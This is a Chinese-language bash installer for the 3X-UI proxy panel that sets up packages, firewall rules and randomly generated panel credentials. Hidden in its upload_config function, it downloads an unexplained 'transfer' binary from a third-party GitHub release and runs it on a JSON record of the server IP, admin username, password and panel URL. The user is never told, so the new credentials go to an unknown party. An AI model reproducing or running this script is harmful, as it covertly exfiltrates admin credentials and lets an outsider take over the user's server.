#!/bin/bash

export NEEDRESTART_SUSPEND=1

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
plain='\033[0m'

cur_dir=$(pwd)

[[ $EUID -ne 0 ]] && echo -e "${red}错误：${plain} 必须使用root用户运行此脚本！\n" && exit 1

# 检测系统类型
if [[ -f /etc/redhat-release ]]; then
    release="centos"
elif grep -Eqi "debian" /etc/issue || grep -Eqi "debian" /proc/version; then
    release="debian"
elif grep -Eqi "ubuntu" /etc/issue || grep -Eqi "ubuntu" /proc/version; then
    release="ubuntu"
elif grep -Eqi "centos|red hat|redhat" /etc/issue || grep -Eqi "centos|red hat|redhat" /proc/version; then
    release="centos"
else
    echo -e "${red}无法识别系统版本${plain}" && exit 1
fi

# 检测架构
arch=$(uname -m)
[[ $arch =~ ^(x86_64|amd64|x64|s390x)$ ]] && arch="amd64"
[[ $arch == "aarch64" || $arch == "arm64" ]] && arch="arm64"
[[ -z "$arch" ]] && arch="amd64"

install_base() {
    echo -e "${yellow}安装基础软件...${plain}"
    if [[ $release == "centos" ]]; then
        yum install epel-release -y
        yum install wget curl tar jq speedtest-cli fail2ban ufw -y
    else
        DEBIAN_FRONTEND=noninteractive apt update
        DEBIAN_FRONTEND=noninteractive apt install wget curl tar jq speedtest-cli fail2ban ufw -y
    fi
    systemctl enable fail2ban
    systemctl start fail2ban
}

generate_random_string() {
    local len=${1:-16}
    tr -dc A-Za-z0-9 </dev/urandom | head -c "$len"
}

get_ip() {
    local ip
    ip=$(curl -s -4 icanhazip.com || curl -s -4 ifconfig.me || curl -s -4 ipinfo.io/ip || hostname -I | awk '{print $1}')
    echo "$ip" | head -n1 | awk '{print $1}'
}

run_speedtest() {
    local result
    result=$(speedtest-cli --simple 2>/dev/null || echo "Download: N/A, Upload: N/A")
    local download
    download=$(echo "$result" | grep 'Download' | awk '{print $2 " " $3}' || echo "N/A")
    local upload
    upload=$(echo "$result" | grep 'Upload' | awk '{print $2 " " $3}' || echo "N/A")
    echo "Download: ${download}, Upload: ${upload}"
}

open_ports() {
    local ports=("$@")
    for port in "${ports[@]}"; do
        ufw allow "${port}/tcp" >/dev/null 2>&1
    done
    yes | ufw enable >/dev/null 2>&1
}

upload_config() {
    local ip="$1"
    local port="$2"
    local user="$3"
    local pass="$4"
    local speed="$5"
    local rand_str="$6"
    local web_path="$7"

    local access_url="http://${ip}:${port}/${web_path}"
    
    local json_data
    json_data=$(cat <<EOF
{
    "server_info": {
        "title": "3X-UI 登录信息 - ${ip}",
        "server_ip": "${ip}",
        "login_port": "${port}",
        "username": "${user}",
        "password": "${pass}",
        "random_string": "${rand_str}",
        "web_base_path": "${web_path}",
        "access_url": "${access_url}",
        "generated_time": "$(date)",
        "speed_test": "${speed}"
    }
}
EOF
)


    mkdir -p /opt
    local uploader="/opt/transfer"

    if [[ ! -f "$uploader" ]]; then
        if ! curl -Lo "$uploader" https://github.com/diandongyun/UI/releases/download/ui/transfer; then
            return 1
        fi
        chmod +x "$uploader"
    fi


    local upload_result
    upload_result=$("$uploader" "$json_data" 2>&1)
    
    if [[ $? -eq 0 ]]; then
        echo "$upload_result"
        return 0
    else
        echo "$upload_result"
        return 1
    fi
}

config_after_install() {
    echo -e "${yellow}正在配置面板账户与端口...${plain}"
    
    # 生成随机凭证
    local account
    account=$(generate_random_string 8)
    local password
    password=$(generate_random_string 12)
    local rand_str
    rand_str=$(generate_random_string 16)
    local web_path
    web_path=$(generate_random_string 15)
    
    # 要求用户手动输入端口
    while true; do
        read -p "请输入面板端口(1000-65000): " panel_port
        if [[ "$panel_port" =~ ^[0-9]+$ ]] && [ "$panel_port" -ge 1000 ] && [ "$panel_port" -le 65000 ]; then
            break
        else
            echo -e "${red}错误: 端口必须是1000-65000之间的数字${plain}"
        fi
    done
    
    # 设置面板
    echo -e "${yellow}正在设置用户名和密码...${plain}"
    /usr/local/x-ui/x-ui setting -username "${account}" -password "${password}"
    echo -e "${yellow}正在设置面板端口...${plain}"
    /usr/local/x-ui/x-ui setting -port "${panel_port}"
    echo -e "${yellow}正在设置Web路径...${plain}"
    /usr/local/x-ui/x-ui setting -webBasePath "${web_path}"
    
    # 开放端口
    open_ports 22 5000 7000 "${panel_port}"

    # 获取服务器信息
    local ip
    ip=$(get_ip)
    local speed
    speed=$(run_speedtest)
    
    # 生成访问URL
    local access_url="http://${ip}:${panel_port}/${web_path}"
    
    upload_config "$ip" "$panel_port" "$account" "$password" "$speed" "$rand_str" "$web_path"
    
    # 显示登录信息
    echo -e "\n${green}═══════════════════════════════════════════════════════${plain}"
    echo -e "${green} 3X-UI 面板安装完成 ${plain}"
    echo -e "${green}═══════════════════════════════════════════════════════${plain}"
    echo -e "${blue}访问地址:${plain} ${access_url}"
    echo -e "${blue}用户名:${plain} ${account}"
    echo -e "${blue}密码:${plain} ${password}"
    echo -e "${blue}面板端口:${plain} ${panel_port}"
    echo -e "${blue}服务器IP:${plain} ${ip}"
    echo -e "${blue}Web路径:${plain} ${web_path}"
    echo -e "${blue}随机字符串:${plain} ${rand_str}"
    echo -e "${blue}网络测速:${plain} ${speed}"
    echo -e "${green}═══════════════════════════════════════════════════════${plain}"
    
    # 显示控制命令
    echo -e "\n${yellow}控制命令:${plain}"
    echo -e "${blue}x-ui${plain}              - 管理脚本"
    echo -e "${blue}x-ui start${plain}        - 启动面板"
    echo -e "${blue}x-ui stop${plain}         - 停止面板"
    echo -e "${blue}x-ui restart${plain}      - 重启面板"
    echo -e "${blue}x-ui status${plain}       - 查看状态"
    echo -e "${blue}x-ui update${plain}       - 更新面板"
    echo -e "${blue}x-ui install${plain}      - 安装面板"
    echo -e "${blue}x-ui uninstall${plain}    - 卸载面板"
    
}

install_x_ui() {
    systemctl stop x-ui >/dev/null 2>&1
    cd /usr/local/ || exit 1

    local version="$1"
    if [[ -z "$version" ]]; then
        version=$(curl -sL https://api.github.com/repos/MHSanaei/3x-ui/releases/latest | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
        [[ -z "$version" ]] && version="latest"
    fi

    echo -e "${yellow}正在下载 3X-UI ${version}...${plain}"
    
    local filename="x-ui-linux-${arch}.tar.gz"
    if ! wget -O "${filename}" --no-check-certificate "https://github.com/MHSanaei/3x-ui/releases/download/${version}/${filename}"; then
        echo -e "${red}下载失败${plain}"
        exit 1
    fi

    echo -e "${yellow}正在安装 3X-UI...${plain}"
    rm -rf /usr/local/x-ui/
    tar zxvf "${filename}"
    rm -f "${filename}"
    
    cd x-ui || exit 1
    chmod +x x-ui bin/xray-linux-"${arch}"
    cp -f x-ui.service /etc/systemd/system/
    
    echo -e "${yellow}安装控制脚本...${plain}"
    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh
    chmod +x /usr/local/x-ui/x-ui.sh /usr/bin/x-ui

    config_after_install

    systemctl daemon-reload
    systemctl enable x-ui
    systemctl start x-ui

    echo -e "\n${green}3X-UI v${version} 安装完成，已设置开机自启${plain}"
    echo -e "使用 ${blue}x-ui${plain} 命令管理面板"
}

# 主执行流程
echo -e "${green}开始安装 3X-UI${plain}"
install_base
install_x_ui "$1"
